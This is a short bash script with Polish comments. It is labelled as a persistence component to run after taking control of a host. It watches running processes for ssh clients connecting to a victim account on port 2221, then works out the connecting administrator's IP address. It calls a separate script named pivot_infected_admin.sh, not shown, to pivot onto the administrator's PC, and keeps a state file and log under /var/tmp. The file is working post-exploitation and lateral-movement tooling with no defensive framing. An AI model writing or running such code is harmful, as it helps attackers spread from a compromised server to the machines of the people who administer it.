#!/usr/bin/env bash
# Persistence: po kontroli hosta — gdy pojawi się klient ssh, auto-pivot na admin PC.
# Usage: sudo ./watch_ssh_client_pivot.sh [ADMIN_IP]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ADMIN_IP="${1:-}"
SSH_SERVER_PORT="${SSH_SERVER_PORT:-2221}"
VICTIM_USER="${VICTIM_USER:-legacy}"
INTERVAL="${INTERVAL:-3}"
STATE="${STATE_FILE:-/var/tmp/.ssh_pivot_seen_pids}"

touch "$STATE"
export VICTIM_USER SSH_SERVER_PORT ADMIN_IP ADMIN_USER ADMIN_SSH_PORT

while true; do
  mapfile -t pids < <(ps -eo pid=,cmd= | grep -E "[s]sh .*(-p )?${SSH_SERVER_PORT}.*${VICTIM_USER}@" | awk '{print $1}')
  for pid in "${pids[@]}"; do
    [[ -z "$pid" ]] && continue
    grep -qx "$pid" "$STATE" 2>/dev/null && continue
    echo "$pid" >>"$STATE"
    echo "[watch] new ssh client PID=$pid — pivot"
    if [[ -z "$ADMIN_IP" ]]; then
      ADMIN_IP=$(ss -tnH state established "( sport = :${SSH_SERVER_PORT} )" \
        | awk '{print $4}' | sed 's/:.*//' | head -1)
    fi
    [[ -n "$ADMIN_IP" ]] || { echo "[watch] skip PID=$pid (no ADMIN_IP)"; continue; }
    "$DIR/pivot_infected_admin.sh" "$ADMIN_IP" >>/var/tmp/ssh_pivot.log 2>&1 || true
  done
  sleep "$INTERVAL"
done